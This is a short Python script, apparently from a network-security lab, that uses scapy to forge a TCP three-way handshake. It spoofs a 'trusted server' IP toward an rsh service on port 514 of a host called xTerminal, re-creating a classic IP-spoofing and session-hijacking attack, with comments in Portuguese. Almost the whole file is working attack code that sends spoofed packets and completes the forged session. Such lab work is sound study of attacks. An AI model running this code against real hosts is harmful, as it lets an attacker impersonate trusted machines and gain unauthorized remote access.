from scapy.all import IP, TCP, send
from isn_probe import capture_isn

XTERMINAL_IP = "10.0.2.20"
TRUSTED_IP = "10.0.2.30"
TARGET_PORT = 514
SYN_SEQ = 1000  # seq escolhido pelo atacante no SYN inicial


def forge_handshake() -> tuple[int, int, int] | None:
    """
    Forja o three-way handshake com xTerminal fingindo ser o Servidor Confiável.
    Retorna (seq, ack, sport) para continuar a sessão TCP, ou None se falhar.
    """

    # --- Passo 1 + 2: envia SYN forjado e captura o ISN do SYN-ACK ---
    print("[*] Passo 1: enviando SYN forjado como Servidor Confiável...")
    print("[*] Passo 2: aguardando SYN-ACK do xTerminal para capturar ISN...")
    result = capture_isn()
    if result is None:
        print("[-] Handshake abortado: sem resposta do xTerminal.")
        return None

    isn, sport = result

    # --- Passo 3: envia ACK para completar o handshake ---
    print("[*] Passo 3: enviando ACK com ISN+1 para completar o handshake...")
    ack = IP(dst=XTERMINAL_IP, src=TRUSTED_IP) / TCP(
        sport=sport,
        dport=TARGET_PORT,
        flags="A",
        seq=SYN_SEQ + 1,  # nosso seq avança após o SYN
        ack=isn + 1,       # confirma o ISN do xTerminal
    )
    send(ack, verbose=False)

    print("[+] Handshake concluído. Sessão TCP estabelecida com xTerminal.")
    print(f"    src={TRUSTED_IP}:{sport} → dst={XTERMINAL_IP}:{TARGET_PORT}")
    print(f"    seq local={SYN_SEQ + 1} | ack={isn + 1}")
    return SYN_SEQ + 1, isn + 1, sport


if __name__ == "__main__":
    forge_handshake()
